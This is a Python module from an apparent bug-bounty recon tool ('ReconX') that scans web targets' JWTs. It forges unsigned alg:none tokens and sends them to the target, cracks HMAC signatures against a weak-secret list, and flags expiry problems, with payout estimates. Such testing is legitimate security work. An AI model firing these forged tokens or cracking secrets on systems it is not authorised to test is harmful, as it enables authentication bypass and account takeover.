# modules/vuln/web/jwt_scanner.py
"""ReconX - JWT Security Scanner.

Tests JWT tokens for:
  - alg:none bypass
  - Weak HMAC secrets
  - Missing signature
  - Kid header injection (basic)
"""

import re
import ssl
import json
import base64
import hmac
import hashlib
import logging
import urllib.request
import urllib.error
from datetime import datetime

logger = logging.getLogger("ReconX.jwt")


# Common weak secrets (top 20)
WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "test",
    "jwt", "token", "changeme", "private", "public",
    "your-256-bit-secret", "secretkey", "mysecret", "supersecret",
    "jwt-secret", "jwt_secret", "jwtkey", "jwt-key", "default",
    "qwerty", "letmein", "welcome", "root", "toor",
]


def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url, timeout=10, headers=None):
    h = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"}
    if headers:
        h.update(headers)
    try:
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ctx()) as r:
            return r.status, r.read(100000).decode("utf-8", errors="ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(50000).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return e.code, body, dict(e.headers) if e.headers else {}
    except Exception as e:
        return None, str(e), {}


# ============================================================
# JWT Helpers
# ============================================================

def _b64url_decode(s):
    """Decode base64url with padding."""
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(data):
    """Encode to base64url without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token):
    """Decode JWT without verifying signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return None

    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "raw": token,
        }
    except Exception as e:
        logger.debug(f"JWT decode failed: {e}")
        return None


def extract_jwts(target, timeout=10):
    """Extract JWTs from response body + headers."""
    tokens = set()

    status, body, headers = _fetch(target, timeout=timeout)

    if status is None:
        return []

    # From Set-Cookie headers
    for k, v in headers.items():
        if k.lower() in ("set-cookie",):
            for m in re.finditer(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", v):
                tokens.add(m.group(0))

    # From body
    if body:
        for m in re.finditer(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", body):
            tokens.add(m.group(0))

    return list(tokens)


# ============================================================
# Vulnerability Tests
# ============================================================

def test_alg_none(token, target, timeout=10, verbose=False):
    """Test alg:none bypass — craft unsigned JWT."""
    decoded = decode_jwt(token)
    if not decoded:
        return None

    # Craft new token with alg:none
    new_header = dict(decoded["header"])
    new_header["alg"] = "none"

    # Try "none" and "None" and "NONE"
    for alg_variant in ["none", "None", "NONE", "nOnE"]:
        new_header["alg"] = alg_variant

        unsigned = (
            _b64url_encode(json.dumps(new_header, separators=(",", ":"))) + "." +
            _b64url_encode(json.dumps(decoded["payload"], separators=(",", ":"))) + "."
        )

        # Send with JWT in Authorization header
        status, body, _ = _fetch(target, timeout=timeout, headers={
            "Authorization": f"Bearer {unsigned}",
        })

        # If 200 and no error keywords → likely accepted
        if status in (200, 201, 204):
            body_lower = body.lower()
            if not any(kw in body_lower for kw in
                       ["invalid", "unauthorized", "forbidden", "expired", "signature"]):
                return {
                    "id": "jwt_alg_none",
                    "title": f"JWT alg:none bypass accepted (alg='{alg_variant}')",
                    "severity": "critical",
                    "bug_class": "jwt_algorithm_confusion",
                    "payout_potential": "$1000-$5000",
                    "confidence": 0.85,
                    "url": target,
                    "evidence": f"Server accepted unsigned JWT with alg={alg_variant}",
                    "source": "custom_jwt",
                }

    return None


def test_weak_secret(token, target, timeout=10, verbose=False):
    """Test common weak HMAC secrets."""
    decoded = decode_jwt(token)
    if not decoded:
        return None

    alg = decoded["header"].get("alg", "").upper()
    if alg not in ("HS256", "HS384", "HS512"):
        return None

    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = parts[2]

    hash_funcs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    hash_func = hash_funcs[alg]

    for secret in WEAK_SECRETS:
        sig_bytes = hmac.new(secret.encode(), signing_input, hash_func).digest()
        sig_b64 = _b64url_encode(sig_bytes)

        if sig_b64 == expected_sig:
            return {
                "id": "jwt_weak_secret",
                "title": f"JWT signed with weak secret: '{secret}'",
                "severity": "critical",
                "bug_class": "jwt_weak_secret",
                "payout_potential": "$1000-$5000",
                "confidence": 0.99,
                "url": target,
                "evidence": f"HMAC secret '{secret}' matches signature",
                "secret": secret,
                "source": "custom_jwt",
            }

    return None


def check_jwt_structure(token, target):
    """Check JWT structure issues."""
    decoded = decode_jwt(token)
    if not decoded:
        return []

    findings = []

    header = decoded["header"]
    payload = decoded["payload"]

    # 1. alg:none in header
    alg = header.get("alg", "")
    if alg.lower() in ("none", ""):
        findings.append({
            "id": "jwt_alg_none_present",
            "title": f"JWT uses alg='{alg or 'none'}' (no signature)",
            "severity": "critical",
            "bug_class": "jwt_no_signature",
            "payout_potential": "$1000-$5000",
            "confidence": 0.95,
            "url": target,
            "evidence": f"JWT header: alg={alg}",
            "source": "custom_jwt",
        })

    # 2. Long expiry
    if "exp" in payload and "iat" in payload:
        try:
            lifetime = payload["exp"] - payload["iat"]
            if lifetime > 86400 * 30:  # > 30 days
                findings.append({
                    "id": "jwt_long_expiry",
                    "title": f"JWT has very long lifetime ({lifetime // 86400} days)",
                    "severity": "low",
                    "bug_class": "jwt_configuration",
                    "payout_potential": "$0-$200",
                    "confidence": 0.90,
                    "url": target,
                    "evidence": f"Token lifetime: {lifetime // 86400} days",
                    "source": "custom_jwt",
                })
        except Exception:
            pass

    # 3. No expiration
    if "exp" not in payload:
        findings.append({
            "id": "jwt_no_expiry",
            "title": "JWT has no expiration claim (exp)",
            "severity": "medium",
            "bug_class": "jwt_configuration",
            "payout_potential": "$100-$500",
            "confidence": 0.95,
            "url": target,
            "evidence": "Payload missing 'exp' field",
            "source": "custom_jwt",
        })

    return findings


# ============================================================
# Main Scan
# ============================================================

def scan(target, jwt_token=None, timeout=10, verbose=False):
    """Full JWT scan."""
    result = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "tokens_found": 0,
        "tokens_tested": 0,
        "findings": [],
        "error": None,
    }

    # Get tokens
    if jwt_token:
        tokens = [jwt_token]
    else:
        if verbose:
            print(f"  [*] Extracting JWTs from response...")
        tokens = extract_jwts(target, timeout=timeout)

    result["tokens_found"] = len(tokens)

    if not tokens:
        result["error"] = "no JWT tokens found in response"
        return result

    # Test each token
    for i, token in enumerate(tokens[:3]):
        decoded = decode_jwt(token)
        if not decoded:
            continue

        if verbose:
            alg = decoded["header"].get("alg", "?")
            print(f"  [*] Token #{i+1}: alg={alg}")

        result["tokens_tested"] += 1

        # Structure checks (fast)
        findings = check_jwt_structure(token, target)
        result["findings"].extend(findings)

        # alg:none bypass
        if verbose:
            print(f"  [*] Testing alg:none bypass...")
        finding = test_alg_none(token, target, timeout=timeout, verbose=verbose)
        if finding:
            result["findings"].append(finding)

        # Weak secret
        if verbose:
            print(f"  [*] Testing {len(WEAK_SECRETS)} weak secrets...")
        finding = test_weak_secret(token, target, timeout=timeout, verbose=verbose)
        if finding:
            result["findings"].append(finding)

    # Dedupe
    seen = set()
    unique = []
    for f in result["findings"]:
        key = f["id"]
        if key not in seen:
            seen.add(key)
            unique.append(f)

    result["findings"] = unique
    return result


def print_report(result):
    print("\n" + "=" * 70)
    print("  JWT Scanner — ReconX")
    print("=" * 70)

    print(f"\n[*] Target:        {result.get('target')}")
    print(f"[*] Tokens found:  {result.get('tokens_found', 0)}")
    print(f"[*] Tokens tested: {result.get('tokens_tested', 0)}")
    print(f"[*] Findings:      {len(result.get('findings', []))}")

    if result.get("error"):
        print(f"\n[!] {result['error']}")
        return

    if result.get("findings"):
        icons = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}
        for f in result["findings"]:
            sev = f.get("severity", "info")
            icon = icons.get(sev, "⚪")
            print(f"\n  {icon} [{sev.upper()}] {f['title']}")
            print(f"       Evidence: {f.get('evidence', '?')}")
            print(f"       Payout:   {f.get('payout_potential', '?')}")
            print(f"       Source:   {f.get('source', '?')}")
    else:
        print(f"\n[OK] No JWT issues found")

    print("\n" + "=" * 70 + "\n")


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO)

    if len(sys.argv) < 2:
        print("Usage:")
        print("  python -m modules.vuln.web.jwt_scanner <url>")
        print("  python -m modules.vuln.web.jwt_scanner <url> <jwt_token>")
        print("")
        print("Examples:")
        print("  python -m modules.vuln.web.jwt_scanner https://example.com/api/me")
        print("  python -m modules.vuln.web.jwt_scanner https://example.com 'eyJhbGc...'")
        sys.exit(1)

    url = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 else None

    print(f"\n[*] JWT scan: {url}")
    if token:
        print(f"[*] Using provided token")

    result = scan(url, jwt_token=token, verbose=True)
    print_report(result)
